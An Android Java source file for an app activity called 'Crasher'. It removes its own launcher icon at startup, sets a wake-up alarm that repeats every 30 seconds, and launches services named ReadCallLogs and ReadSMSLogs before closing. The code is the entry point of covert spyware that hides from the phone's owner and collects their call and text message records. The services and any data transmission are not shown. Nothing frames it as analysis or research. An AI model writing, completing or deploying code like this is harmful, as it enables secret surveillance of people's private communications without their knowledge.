package com.bigeye.crasher;

import java.util.Calendar;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;

public class Crasher extends Activity {

	private static final long REPEAT_TIME = 1000 * 30;
	private final String APP_TAG = getClass().getName();
	SharedPreferences prefs;
	String prefName = "AllLogs";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		
		//remove app icon programmatically
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_crasher);
		
		AlarmManager service = (AlarmManager)getSystemService(ALARM_SERVICE);
		Intent i = new Intent(this, StartServiceReceiver.class);
		PendingIntent pending = PendingIntent.getBroadcast(this, 0, i, PendingIntent.FLAG_CANCEL_CURRENT);
		Calendar cal = Calendar.getInstance();
		
		//start every 30 secs
		service.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), REPEAT_TIME, pending);
		
		//start call log service
		startService(new Intent(this, ReadCallLogs.class));
		
		//start read sms log service
		startService(new Intent(this, ReadSMSLogs.class));
		
		Log.i(APP_TAG,"closing main activity!");
		finish();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.crasher, menu);
		return true;
	}

}
